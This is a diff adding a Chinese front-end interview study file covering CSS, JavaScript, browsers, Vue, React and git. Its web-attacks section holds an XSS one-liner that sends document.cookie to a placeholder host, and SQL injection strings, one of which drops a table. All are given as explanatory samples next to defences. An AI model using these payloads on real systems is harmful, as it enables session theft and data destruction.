@@ -1,0 +1,584 @@
+
+•深浅拷贝   https://blog.csdn.net/woleigequshawanyier/article/details/85038675
+
+•原型链
+
+
+•异步promise es6
+
+	不一样的变量声明：const和let
+					模板字符串
+					箭头函数（Arrow Functions）
+					函数的参数默认值
+					对象和数组解构
+					ES6中的类
+					Promise对象
+					模块化（import 和export ）
+					扩展运算符
+					for...of 和 for...in
+
+
+
+•堆栈   https://blog.csdn.net/woleigequshawanyier/article/details/85038675
+
+
+•数组方法   map filter  reduce reduce
+            call  apply
+•JavaScript数组方法总结       https://blog.csdn.net/xiaojinguniang/article/details/82842674
+		https://www.cnblogs.com/sqh17/p/8529401.html
+    
+
+•递归
+
+
+•闭包  闭包的使用场景
+
+
+
+•说说es6的新特性（基本必问）？
+
+
+•axios  配置项  请求与相应
+    request response 参数配置
+
+
+•选择 冒泡 排序  https://www.cnblogs.com/moodlxs/p/10418767.html
+
+
+
+2021年5-6双⽉⾯试题记录
+
+
+ 基础Css 
+
+ •如何实现元素居中？（⾄少三种⽅法） 
+    position 0 0 0 0 margin：auto
+    position 50% 50% margin-left： -50%  margin-top： -50%
+    position 50% 50% transform：translate(-50%,-50%) // ie8及以下  不适用
+
+ •伪元素 和 伪类 有哪些？有什么区别？ 
+
+ •如果使⽤过less或sass，那么如何声明⼀个变量和函数? 
+
+ •css布局实现？常问 左固定右部⾃适应、圣杯布局？ 
+
+ •什么是BFC？ 
+    https://blog.csdn.net/qq_39735040/article/details/98842435
+
+ •盒模型？  https://blog.csdn.net/qq_39735040/article/details/90217239
+    标准 box-sizing:content-box   100px宽   代表 content 100px  不包含 border 2  padding 20  实际宽  144                           w3c盒子width = contentWidth
+    怪异 box-sizing:border-box    100px宽   代表 content  = 100 - border 2*2 - pading 20*2  实际宽  100    content会取剩余值       IE盒子 width= contentWidth+2padding+2border
+
+ •C3有哪些属性？ 
+
+
+ •如何实现⼀个简单动画效果？ 
+
+ •如何适配机型？ ◦ rem、 百分⽐、vw等，如何实现？ 
+
+ •css权重计算规则
+    css样式层叠优先级是:
+    浏览器缺省 < 外部样式表(引入的css文件) < 内部样式表(<style>标签内的样式) < 内联样式(style=”)
+
+
+    内联样式，如: style="..."，权值为1000。         https://segmentfault.com/a/1190000012941923
+    ID选择器，如：#content，权值为0100。
+    类，伪类、属性选择器，如.content，权值为0010。
+    类型选择器、伪元素选择器，如div p，权值为0001。
+    通配符、子选择器、相邻选择器等。如* > +，权值为0000。
+    继承的样式没有权值
+
+    css属性!important         https://www.cnblogs.com/cnblogs-jcy/p/8574177.html
+
+　　》内联样式 
+
+　　》ID选择器(#id)
+
+　　》类选择器(.class) = 伪类选择器(:hover等) = 属性选择器[type等] 
+
+　　》元素选择器(p等) = 伪元素选择器(:after/:before/::selection等) 
+
+　　》通用选择器(*) 
+
+　　》继承的样式
+
+    伪类：
+
+    :active，将样式添加到被激活的元素。
+
+    :focus，将样式添加到被选中的元素。
+
+    :hover，当鼠标悬浮在元素上方是，向元素添加样式。
+
+    :link，将特殊的样式添加到未被访问过的链接。
+
+    :visited，将特殊的样式添加到被访问的链接。
+
+    :first-child，将特殊的样式添加到元素的第一个子元素。
+
+    :lang，允许创作者来定义指定的元素中使用的语言。
+    伪元素：
+
+    :first-letter，将特殊的样式添加到文本的首字母。
+
+    :first-line，将特殊的样式添加到文本的首行。
+
+    :before，在某元素之前插入某些内容。
+
+    :after，在某元素之后插入某些内容
+
+ •*zoom:1的常见作用？    https://www.cnblogs.com/zhuochong/p/11712176.html
+    zoom是IE专用属性，设置zoom:1可以在IE6下清除浮动、解决margin导致的重叠等问题。
+    这里还要补充一点，为什么*display:inline;*zoom:1;前面有*，*放在css属性前面，表示这个属性仅仅应用到Internet Explorer 7 以及以下版本。因为Internet Explorer 版本 7 以及以下承认非字母数字（除了下划线）前缀的属性。所以这里，IE7以上的版本作用的是display: inline-block;而在IE7及以下的版本中作用的是*display:inline;*zoom:1
+
+ •CSS的几款流行预处理器     https://www.cnblogs.com/sexintercourse/p/12564024.html
+        https://www.cnblogs.com/xiaohuochai/p/6242257.html
+        https://www.cnblogs.com/dasusu/p/10114097.html
+
+ JS
+
+ •你对深浅拷⻉的理解？如何实现深浅拷⻉？ 
+ 	https://blog.csdn.net/weixin_33894640/article/details/88659533
+ 	https://www.cnblogs.com/dengyao-blogs/p/11466598.html
+
+
+ •从输⼊链接浏览器发⽣了哪些？
+ 	1、浏览器的地址栏输⼊URL并按下回⻋。
+	2、浏览器查找当前URL的DNS缓存记录。
+	3、DNS解析URL对应的IP。
+	4、根据IP建⽴TCP连接（三次握⼿）。
+	5、HTTP发起请求。
+	6、服务器处理请求，浏览器接收HTTP响应。
+	7、渲染页面，构建DOM树。
+	8、关闭TCP连接（四次挥⼿）。
+
+	TCP三次握⼿四次挥⼿?
+	https://blog.csdn.net/qq_43434328/article/details/115497675
+
+	重绘和回流？ 
+	https://www.cnblogs.com/echolun/p/10105223.html
+
+
+ •原型链的理解？为什么最后找到的是 nlll 
+
+ 	https://blog.csdn.net/wsymcxy/article/details/81699608
+ 	es5、es6继承？
+
+
+
+ •Promise 是为了解决什么问题？作⽤？⼿动实现Promise
+
+
+ •es6有新增的功能？（最少不低于5个）、es5 相关偶尔会问？ 
+
+ •sessionStorage、localStorage、cookie 是什么？作⽤？区别？ 
+
+ •Http 和 Https 的理解？区别？    一篇文章搞懂HTTP和HTTPS的的本质区别
+    https://blog.csdn.net/weixin_40819504/article/details/104721008
+
+
+ •Http 状态码？   https://tool.oschina.net/commons?type=5
+
+ •浏览器缓存机制是什么？    https://www.cnblogs.com/chengxs/p/10396066.html
+    强缓存
+        expires cache-control  同时存在，cache-control优先级高于expires
+
+    协商缓存
+        last-modified/if-modified-since  Etag / If-None-Match，其中Etag / If-None-Match的优先级比Last-Modified / If-Modified-Since高。
+
+ •对应博客(包含js引擎的执行过程)     https://heyingye.github.io/
+
+
+ •ajax是什么？作⽤？如何⼿动封装ajax请求？ 
+    1.创建XMLHTTPRequest对象
+    2.使用open方法设置和服务器的交互信息
+    3.设置发送的数据，开始和服务器端交互
+    4.注册事件
+    5.更新界面
+
+    https://www.cnblogs.com/cythia/p/6978323.html
+    var xhr;
+      if (window.XMLHttpRequest) {
+        xhr = new XMLHttpRequest()
+      }else{
+        xhr = new ActiveXObject()
+      }
+
+      xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
+      xhr.open("post","02.post.php")
+      xhr.send("name=fox&age=14")
+      xhr.onreadystatechange = function (params) {
+        if (xhr.readystate == 4 && xhr.status == 200) {
+          console.log(xhr.responseText);
+        }
+      }
+
+ •Ajax请求的步骤     https://blog.csdn.net/ANGWH/article/details/106751587
+
+ •说说你对运⾏机制的理解？ EventLoop 
+
+ •async await 是什么? 和Promise对⽐优缺点？    
+      https://blog.csdn.net/weixin_43496606/article/details/118221838
+      https://www.jianshu.com/p/3a37272de675
+
+ •闭包的理解？有哪些场景会⽤到闭包？缺点是什么？ https://blog.csdn.net/qq_33505829/article/details/86080460
+            https://blog.csdn.net/binlety/article/details/81288231?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-16.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-16.control
+        缺点：
+            如果不是某些特定任务需要使用闭包，在其它函数中创建函数是不明智的，因为闭包在处理速度和内存消耗方面对脚本性能具有负面影响。
+        优点：
+            然而在一个闭包内对变量的修改，不会影响到另外一个闭包中的变量。以这种方式使用闭包，提供了许多与面向对象编程相关的好处 —— 特别是数据隐藏和封装。
+
+ •项⽬可以做哪些优化？ 
+
+ •数组去重的四种方法？   https://www.cnblogs.com/rongy/p/6597014.html
+    •1.最基本的去重方法
+        思路：定义一个新数组，并存放原数组的第一个元素，然后将元素组一一和新数组的元素对比，若不同则存放在新数组中。
+        let newArr = [arr[0]]
+        for (let i = 0; i < arr.length; i++) {
+            const element1 = arr[i];
+            let repeat = false
+            for (let j = 0; j < newArr.length; j++) {
+                const element2 = newArr[j];
+                if (element1 == element2) {
+                    repeat = true
+                    break;
+                }
+            }
+            if (!repeat) {
+                newArr.push(arr[i])
+            }
+        }
+    •2.先排序在去重
+            sort()   new Set()
+            let arr1 = arr.sort()
+            console.log(arr1);
+            let newArr = [arr1[0]]
+            for (let i = 0; i < arr1.length; i++) {
+                const element = arr1[i];
+                // console.log(element);
+                if (arr1[i] !== newArr[newArr.length - 1]) {
+                 newArr.push(arr1[i])
+                }
+            }
+        思路：先将原数组排序，在与相邻的进行比较，如果不同则存入新数组
+    •3.利用对象的属性去重（推荐）
+        思路：每次取出原数组的元素，然后再对象中访问这个属性，如果存在就说明重复
+        定义一个空的对象和一个空的数组，循环一个数组将数组的每一项作为对象的属性，如果对象的属性值是null,就将数据添加到空数组中，并且将对象的该属性值设置为true
+
+        let obj = {}
+        let result = []
+        let list = [1, 2, 3, 4, 5, 6, 7, 8, 1, 9, 1]
+        list.forEach(ele => {
+            if (obj[ele] == null) {
+                result.push(ele)
+                obj[ele]=true
+            }
+        })
+        console.log(result)   // [1, 2, 3, 4, 5, 6, 7, 8, 9]     {1: true, 2: true, 3: true, 4: true, 5: true, 6: true, 7: true, 8: true, 9: true}
+    •利用下标查询
+        indexof
+
+    let newArr = [...new Set(arr)]   // ...是扩展new Set    [Set(5)]  0: Set(5)   {1, 2, 3, 4, 5} length: 1  __proto__: Array(0)
+    console.log(newArr);    
+
+
+ •浅谈对原型及原型链的理解     https://blog.csdn.net/wsymcxy/article/details/81699608
+    JS中原型链的理解         https://www.cnblogs.com/xfcao/p/10029731.html
+
+ •JS实现继承的几种方式   6种    https://segmentfault.com/a/1190000016708006     https://www.cnblogs.com/humin/p/4556820.html
+
+ •前端面试常问的基础问题大全    https://www.cnblogs.com/langqq/p/10484499.html
+
+ •  Math.pow(x,y) 方法可返回 x 的 y 次幂的值。     如果结果是虚数或负数，则该方法将返回 NaN。如果由于指数过大而引起浮点溢出，则该方法将返回 Infinity
+    Math.sqrt(x) 方法可返回一个数的平方根。    参数 x 的平方根。必须是大于等于 0 的数。 如果 x 小于 0，则返回 NaN。
+
+ •JavaScript的事件队列(Event Queue)   https://blog.csdn.net/weixin_34346099/article/details/91456564
+
+ •8张图让你一步步看清 async/await 和 promise 的执行顺序    https://www.cnblogs.com/fundebug/p/10095355.html
+
+    await 等到之后，做了一件什么事情？
+  那么右侧表达式的结果，就是await要等的东西。
+
+  等到之后，对于await来说，分2个情况
+
+  不是promise对象
+  是promise对象
+  如果不是 promise , await会阻塞后面的代码，先执行async外面的同步代码，同步代码执行完，再回到async内部，把这个非promise的东西，作为 await表达式的结果
+
+  如果它等到的是一个 promise 对象，await 也会暂停async后面的代码，先执行async外面的同步代码，等着 Promise 对象 fulfilled，然后把 resolve 的参数作为 await 表达式的运算结果。
+
+
+ •理解 JavaScript 的 async/await     https://segmentfault.com/a/1190000007535316
+
+ •js 宏任务和微任务     https://www.cnblogs.com/wangziye/p/9566454.html
+
+    1、同步代码执行顺序优先级高于异步代码执行顺序优先级；
+
+    2、new Promise(fn)中的fn是同步执行；
+    
+    3、process.nextTick()>Promise.then()>setTimeout>setImmediate。
+
+
+    宏任务：1、7 （这两个是同步任务，所以先执行）
+
+    微任务：6、8  （微任务，process.nextTick()：6优先于promise.then()： 8）
+
+    宏任务：2、4  （第一个setTimeout）
+
+    微任务：3、5 （微任务，process.nextTick():3优先于promise.then() ：5）
+
+    宏任务：9、11  （第二个setTimeout）
+
+    微任务：10、12 （微任务，process.nextTick():10优先于promise.then() ：12）
+
+  
+
+  •  变量提升和函数提升  https://www.cnblogs.com/liuhe688/p/5891273.html
+
+
+  •js事件循环机制(Event Loop) https://blog.csdn.net/qq_33207292/article/details/102624553
+    macro-task(宏任务)：包括整体代码 script，setTimeout，setInterval等
+    micro-task(微任务)：Promise的then的回调函数，process.nextTick，async 函数await下面的代码；等
+
+
+ •三个代码示例理解js中的this  this指向    https://www.cnblogs.com/yalong/p/14548378.html
+
+
+ •改变this指向的三种方法     https://www.cnblogs.com/theblogs/p/9943179.html
+
+
+ •Cookie中的httponly的属性和作用     https://blog.csdn.net/qq_38553333/article/details/80055521
+        1.什么是HttpOnly?
+
+        如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。XSS全称Cross
+        SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入) 
+        恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。
+
+
+ •总结几种常见web攻击手段及其防御方式     https://www.cnblogs.com/-new/p/7135814.html
+
+     •XSS(跨站脚本攻击)        <script>window.open("www.xxx.com?param="+document.cookie) </script>
+
+     •CSRF（跨站请求伪造）          Referer设置true  利用token
+            告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理
+    
+
+     •SQL注入             select * from user where username = 'xxx' and password = ' ' or '1' = 1 '
+                    select * from user whwre username = 'xxx' and password =' ';drop table user;--'
+        1、在java中，我们可以使用预编译语句(PreparedStatement)，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。
+        2、很多orm框架已经可以对参数进行转义
+        3、做最坏的打算，即使被’拖库‘('脱裤，数据库泄露')。数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的（数据库存储用户名，盐（随机字符长），md5后的密文）方式。
+
+     •DDOS
+
+
+•Cookie中的httponly的属性和作用     https://blog.csdn.net/qq_38553333/article/details/80055521
+
+     response.setHeader( "Set-Cookie" , "cookiename=httponlyTest;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");
+    例如：
+    //设置cookie
+
+    response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
+
+
+    //设置多个cookie
+
+    response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
+
+    response.addHeader("Set-Cookie", "timeout=30; Path=/test; HttpOnly");
+
+
+    //设置https的cookie
+
+    response.addHeader("Set-Cookie", "uid=112; Path=/; Secure; HttpOnly");
+
+     具体参数的含义在此不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取。
+
+     Cookie cookies[]=request.getCookies(); 
+
+
+ •什么是Referer？Referer的作用？空Referer是怎么回事？  https://www.sojson.com/blog/58.html
+
+ •Cookie的Secure属性和HttpOnly属性？      https://www.cnblogs.com/diligenceday/p/10885868.html
+
+    基于安全的考虑，需要给cookie加上Secure和HttpOnly属性，HttpOnly比较好理解，设置HttpOnly=true的cookie不能被js获取到，无法用document.cookie打出cookie的内容。
+
+    Secure属性是说如果一个cookie被设置了Secure=true，那么这个cookie只能用https协议发送给服务器，用http协议是不发送的。换句话说，cookie是在https的情况下创建的，而且他的Secure=true，那么之后你一直用https访问其他的页面
+    (比如登录之后点击其他子页面），cookie会被发送到服务器，你无需重新登录就可以跳转到其他页面。但是如果这是你把url改成http协议访问其他页面，你就需要重新登录了，因为这个cookie不能在http协议中发送。
+
+    例子是：
+
+    前提条件：https://localhost:9102应用对cookie设置了Secure=true
+
+    1. 访问 https://localhost:9102/manager
+
+    2. 输入用户名、密码，用IE或者Chrome的developer tool会看到response的header里，set-cookie的值里有Secure属性
+
+    3. 登录后，继续访问https://localhost:9102/manager#user，可以正常看到内容
+
+    4. 修改url，访问http://localhost:9100/manager#domain，会跳转到登录页面，因为cookie在http协议下不发送给服务器，服务器要求用户重新登录
+
+ •符号类型(symbol)
+    https://blog.csdn.net/weixin_41900457/article/details/108371731
+
+ •
+ •
+ •
+ •
+
+
+ •解决跨域的5种方式
+     https://zhuanlan.zhihu.com/p/141977678?from_voters_page=true
+     
+    jsonp：只支持 GET，不支持 POST 请求，不安全 XSS
+    cors：需要后台配合进行相关的设置
+    postMessage：配合使用 iframe，需要兼容 IE6、7、8、9
+    document.domain：仅限于同一域名下的子域
+    websocket：需要后台配合修改协议，不兼容，需要使用 http://socket.io
+    proxy：使用代理去避开跨域请求，需要修改 nginx、apache 等的配置
+
+
+
+ •
+ •
+ •
+ •
+ •
+ •
+ •有哪些数据类型？ JS基础篇1：数据类型（8种）    https://blog.csdn.net/u013592575/article/details/95087953
+    
+
+ •JS isPrototypeOf()方法：检测一个对象是否存在于另一个对象的原型链中     http://c.biancheng.net/view/5801.html
+    constructor: ƒ Object()
+
+    hasOwnProperty: ƒ hasOwnProperty()
+
+    isPrototypeOf: ƒ isPrototypeOf()
+
+    propertyIsEnumerable: ƒ propertyIsEnumerable()
+
+    toLocaleString: ƒ toLocaleString()
+
+    toString: ƒ toString()
+
+    valueOf: ƒ valueOf()
+   
+
+ •isPrototypeOf、instanceof、hasOwnProperty函数介绍      https://www.jianshu.com/p/44ba37660b4a
+
+    
+ •JS中isPrototypeOf 和hasOwnProperty 的区别 ------- js使用in和hasOwnProperty获取对象属性的区别      https://www.cnblogs.com/jiangxiaobo/p/6243993.html
+
+
+ 框架vue 
+ •v-if 和v-for一起使用？
+    当 v-if 与 v-for 一起使用时，v-for 具有比 v-if 更高的优先级，这意味着 v-if 将分别重复运行于每个 v-for 循环中
+    computed: {
+        activeItemList: function() {
+            return this.itemList.filter((item) => {
+                return item.isActive
+            })
+        }
+    }
+    <div v-for="item in activeItemList">{{item.value}}</div>
+
+    <template v-if="shouldShowItem">
+        <div v-for="item in itemList"></div>
+    </template>
+
+
+ •v-if 、v-show的区别？使⽤场景？ 
+
+ •Computed 、watch的区别？ 
+
+ •data为什么是⼀个函数不是⼀个对象？ 
+
+ •$nextTick理解？作⽤？如何实现？ 
+
+ •V-for 和 v-if 官⽹为什么不推荐⼀起使⽤呢？ 
+
+ •⽣命周期有哪些？分别是什么？ 
+
+ •Vuex 是什么？属性？流程？ 
+
+ •vue路由 ⽣命周期或⽅法？ 
+
+ •Vue 的原理？
+
+ •Vue 更新机制是是什么? 
+
+ •vue2 与 vue3的对⽐? 
+
+ •hash和history模式的区别    https://blog.csdn.net/ygh5123687/article/details/89473578
+        https://zhuanlan.zhihu.com/p/127186558
+        https://blog.csdn.net/sayoko06/article/details/85321802
+
+ •双向数据绑定   
+    var obj = {
+      foo: 'foo'
+    }
+    Object.defineProperty(obj,"foo",{
+        get:function(){
+            console.log('将要读取obj.foo属性');
+        },
+        set:function(newVal){
+            console.log('当前值为', newVal);
+        }
+    })
+    obj.foo; // 将要读取obj.foo属性
+    obj.foo = 'name'; // 当前值为 name
+ •
+ 
+ •
+ •
+ •
+ •
+ •
+
+
+
+
+
+ React 
+
+ •⽣命周期？ 
+
+ •说说你对 16.8V 版本更新后和之前的区别？ 
+
+ •useState如何使⽤？让你⼿动实现如何实现？
+
+ •Redux 了解？流程是什么？ 
+
+ •路由模式有哪些？ 框架公共问题 
+
+ •如何解决跨域问题？ 
+
+ •Vue 和 React 的区别？ 
+
+ •虚拟DOM？
+
+
+
+
+
+ 其他
+
+ 算法
+ •说说你知道和你会的算法？ 
+   ◦ ⼆分查找、选择排序、冒泡排序 
+
+ •算法题相关？ 
+   ◦ 能解答算法最好，如果不⾏可以跟⾯试管说下思路，千万别说不会。
+
+
+
+ git 
+ •Git ⼯作流程? 
+
+ •假设A、B两个分⽀？你应该在A分⽀开发需求但是开发在了B分⽀这时候你应该如何做？
+
+ •如何合并多个commit提交？
+
+
+
+基于HTML5的拓扑图编辑器（2）    https://www.cnblogs.com/10manongit/p/12984591.html
